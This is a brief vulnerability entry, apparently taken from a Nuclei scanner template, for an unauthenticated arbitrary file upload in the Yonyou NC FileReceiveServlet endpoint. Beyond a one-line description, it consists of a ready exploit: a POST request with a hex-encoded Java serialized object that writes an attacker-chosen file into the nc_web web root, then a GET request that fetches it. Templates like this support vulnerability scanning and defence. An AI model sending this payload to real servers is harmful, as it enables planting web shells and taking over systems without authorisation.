# Vulnerability: Yonyou NC FileReceiveServlet - Aribitrary File Upload
**Classification:** YONYOU
**Source:** Nuclei Template (`yonyou-filereceiveservlet-fileupload.yaml`)

## Description
An unauthorized attacker can upload a file via the FileReceiveServlet endpoint.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /servlet/FileReceiveServlet HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data;

{{hex_decode("ACED0005737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C7708000000100000000274000946494C455F4E414D45740009")}}{{file_name}}{{hex_decode("7400105441524745545F46494C455F504154487400102E2F776562617070732F6E635F77656278")}}{{file_content}}

GET /{{file_name}} HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: {{Hostname}}
```

